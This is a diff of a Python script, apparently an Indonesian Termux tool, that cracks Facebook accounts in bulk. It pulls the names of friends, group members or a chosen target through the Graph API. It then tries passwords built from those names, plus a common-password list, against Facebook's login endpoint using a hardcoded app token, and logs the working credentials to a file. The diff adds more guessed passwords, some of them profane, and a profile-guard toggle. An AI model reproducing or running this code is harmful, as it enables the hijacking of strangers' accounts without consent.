@@ -1,6 +1,8 @@
 #!/usr/bin/python3.7
-# Copyright  : DulLah ©2019
+# -*- Coding: utf-8 -*-
+# Credits     : DulLah
 # Updater    : KMB.ID ( L4.ERORR )
+# Copyright : © 2019
 
 ## USE PYTHON VERSI 3 ##
 
@@ -10,7 +12,7 @@ from getpass import getpass
 try:
 	import requests
 except ImportError:
-	os.system("pip2 install requests")
+	os.system("pip3 install requests")
 from requests.exceptions import ConnectionError
 from multiprocessing.pool import ThreadPool
 
@@ -45,24 +47,26 @@ RE = "\033[0m"
 CR = "\033[1;41;96m"
 
 ### LOGO L4
-logo_4 = """\x1b[1;00m        ▓██      ▒█████    ▄████  ██▓ ███▄    █▓
-        ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █▓
-        ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒
-        ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒
-        ░██████▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░
-        ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒
-        ░ ░\x1b[00m\033[041m T E R M U X  L O G I N  U S E R  \033[00m\x1b[1;00m░░
-          ░ ░   ░   ░    ░ ░   ░    ░   ░   ░\x1b[00m\x1b[1;96m
-╔════════════════════════════════╦═════════════╗
-║ \x1b[1;91m╦  ╦ ╦     ╔═╗ ╔═╗ ╔═╗ ╔═╗ ╔═╗ \x1b[1;96m║  \x1b[1;92m  KMB•ID   \x1b[1;96m║
-║ \x1b[1;91m║  ╚═╣  •  ╠╣  ║   ║   ║ ║ ║   \x1b[1;96m║             ║
-║ \x1b[1;97m╩╝   ╩     ╚═╝ ╩   ╩   ╚═╝ ╩   \x1b[1;96m║\x1b[1;93m 088217145014\x1b[1;96m║
-╚════════════════════════════════╩═════════════╝"""
+logo_4 = """\x1b[00m\x1b[96m
+ ╔══════════════════════════════╦════════════════╗
+ ║ \x1b[1;91m╦ ╦ ╦   ╔═╗ ╔═╗ ╔═╗ ╔═╗ ╔═╗  \x1b[1;96m║\x1b[41;92m    KMB • ID    \x1b[0m\x1b[1;96m║
+ ║ \x1b[1;91m║ ╚-╣ • ╠╣  ║   ║   ║ ║ ║    \x1b[1;96m╠\x1b[41;96m════🛡️══════🛡️════\x1b[0m\x1b[96m╣
+ ║ \x1b[1;97m╩╝  ╩   ╚═╝ ╩   ╩   ╚═╝ ╩ \x1b[93m404\x1b[1;96m║\x1b[1;47;91m© \x1b[94mcopyright \x1b[95m2019\x1b[0m\x1b[1;96m║
+ ╚══════════════════════════════╩════════════════╝"""
 
 ### Siapa Kamu ###
 def siapa():
 	os.system('clear')
 	print(logo_4)
+	print ('''\x1b[00m     ▓▀██      ▒█████    ▄████  ▀▀▓ ███▄   ▀█▓
+      ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █▓
+      ▒██░    ▒██░  ██▒▒██░▄▄▄░▒██▒▓██  ▀█ ██▒
+      ▒██░    ▒██   ██░░▓█  ██▓░██░▓██▒  ▐▌██▒
+      ░█▄▄██▀▒░ ████▓▒░░▒▓███▀▒░██░▒██░   ▓██░
+      ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░▓  ░ ▒░   ▒ ▒
+      ░ ░\x1b[00m\033[3;93;41m C R E A T E  U S E R  L O G I N \033[00m\x1b[1;00m░ ░
+        ░ ░   ░   ░    ░ ░   ░    ░   ░   ░
+         ▒     ░        ░        ░       ▒''')
 	nama = input("\x1b[96m╔═════▶\033[1;93m Isi Data Konfirmasi Nama Anda !!!\n\x1b[96m╚══▶ \x1b[1;94mNick \x1b[1;91m|\x1b[1;94m Name \033[1;91m: \033[1;92m")
 	if nama =="":
 		print("\033[1;96m[!] \033[1;91mIsi yang benar")
@@ -168,12 +172,13 @@ def menu(n,id,toket):
 	print("\x1b[1;92m║  \x1b[1;94m(((\x1b[1;91m●\x1b[1;94m))) \x1b[4;97mSelamat datang, Saudara(\x1b[91mi\x1b[97m)\033[0m \x1b[1;94m(((\x1b[1;91m●\x1b[1;94m)))  \x1b[1;92m║")
 	print("\x1b[1;92m║        \x1b[1;96mUser \x1b[1;91m: \033[1;93m"+ n + (31 - len(n)) * "\x1b[1;92m " + "║")
 	print("\x1b[1;92m║        \x1b[1;96mID   \x1b[1;91m: \033[1;93m"+ id + (31 - len(id)) * "\x1b[1;92m " + "║")
-	print("\x1b[1;92m╠"+46*"═"+"╝")
+	print("\x1b[1;92m╠"+16*"═"+"\x1b[1;91m❴\x1b[3;4;97m MENU TOOLS \x1b[0m\x1b[1;91m❵\x1b[1;96m"+16*"═"+"╝")
 	jalan("""\033[1;92m╠══▶ \033[1;93m[\033[1;95m01\033[1;93m] \033[2;3;4;97mCrack From Friend\033[0m 
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m02\033[1;93m] \033[2;3;4;97mCrack From List Friends to Friend\033[0m
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m03\033[1;93m] \033[2;3;4;97mCrack From Group\033[0m
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m04\033[1;93m] \033[2;3;4;97mCrack From Request Friend\033[0m\x1b[92m(Follower)
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m05\033[1;93m] \033[2;3;4;97mCrack From Friend\033[0m \x1b[92m(Target)
+\033[1;92m╠══▶ \033[1;93m[\033[1;93m06\033[1;93m] \033[2;3;4;97mTools Profile Guard FB🛡️
 \033[1;92m║
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m00\033[1;93m] \033[2;3;4;91mLog out account\033[0m
 \033[1;92m╠══▶ \033[1;93m[\033[1;95m99\033[1;93m] \033[2;3;4;93mExit\033[0m 
@@ -244,6 +249,9 @@ def menu(n,id,toket):
 		for tr in s.get(url.format(idt+"/friends?access_token=%s"%(toket))).json()["data"]:
 			target.append(tr["id"])
 			
+	elif kmb =="6" or kmb =="06":
+		guard()
+		
 	elif kmb =="0" or kmb =="00":
 		os.system("rm -rf cookie")
 		cek()
@@ -256,7 +264,8 @@ def menu(n,id,toket):
 		os.system('clear')
 		menu(n,id,toket)
 		
-		jalan("""\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;92mScaning ....""") 
+	print
+	jalan("""\033[1;95m[\033[1;97m#\033[1;95m] \x1b[1;92mScaning ....""") 
 	print("\033[1;95m[\033[1;97m?\033[1;95m] \033[1;92mPlease wait \033[1;91m. . . . ") 
 	print("\033[1;95m[\033[1;97m✸\033[1;95m] \033[1;92mCrack \033[1;97m... ... ... ") 
 	
@@ -279,7 +288,7 @@ def x(user):
 		fn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
 		mn = s.get(url.format(user+"?access_token=%s"%(toket))).json()["middle_name"]
 		ln = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
-		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang1","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Brengsek","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123"]:
+		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Bacot","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("hasil/ok.txt","a").write("%s | %s\n"%(user,pas))
@@ -306,6 +315,68 @@ def result(found,checkpoint):
 	if len(found)==0 and len(checkpoint)==0:
 		print("\n\x1b[1;96m[\x1b[1;92m!\x1b[1;96m]\x1b[1;97m No result found :'(")
 		
+##### PROFIL GUARD #####
+def guard():
+	global toket
+	os.system('clear')
+	try:
+		toket = open("cookie/token.log","r").read()
+	except IOError:
+		print ("\033[1;91m[!] Token not found")
+		os.system("rm -rf cookie/token.log")
+		sleep(1)
+		login()
+	os.system('clear')
+	benner()
+	print("\x1b[1;92m╔"+47*"═")
+	print ("\x1b[96m╠▶\033[1;93m[ \033[1;97m1 \033[1;93m]\033[1;97m Activate")
+	print ("\x1b[96m╠▶\033[1;93m[ \033[1;97m2 \033[1;93m]\033[1;97m Not activate")
+	print ("\x1b[96m╠▶\033[1;93m[ \033[1;91m0 \033[1;93m]\033[1;97m Back")
+	print ("\x1b[96m║")
+	g = input("\x1b[96m╚▶\033[1;41;96m KMB•ID \x1b[0;0m\033[1;97m>>> ")
+	if g == "1":
+		aktif = "true"
+		gaz(toket, aktif)
+	elif g == "2":
+		non = "false"
+		gaz(toket, non)
+	elif g =="0":
+		menu(n,id,toket)
+	elif g =="":
+		guard()
+	else:
+		print ("\x1b[91mSALAH !!!")
+		exit()
+##1
+def get_userid(toket):
+	url = ("https://graph.facebook.com/me?access_token=%s"%toket)
+	res = requests.get(url)
+	uid = json.loads(res.text)
+	return uid["id"]
+	
+###2
+def gaz(toket, enable = True):
+	id = get_userid(toket)
+	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
+	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
+	url = "https://graph.facebook.com/graphql"
+	res = requests.post(url, data = data, headers = headers)
+	print (res.text)
+	if '"is_shielded":true' in res.text:
+		os.system('clear')
+		print(logo_4)
+		print ("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate")
+		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu(n,id,toket)
+	elif '"is_shielded":false' in res.text:
+		os.system('clear')
+		print(logo_4)
+		print ("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate")
+		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu(n,id,toket)
+	else:
+		print ("\033[1;91m[!] Error")
+		exit()
 
 if __name__ == '__main__':
 	siapa()
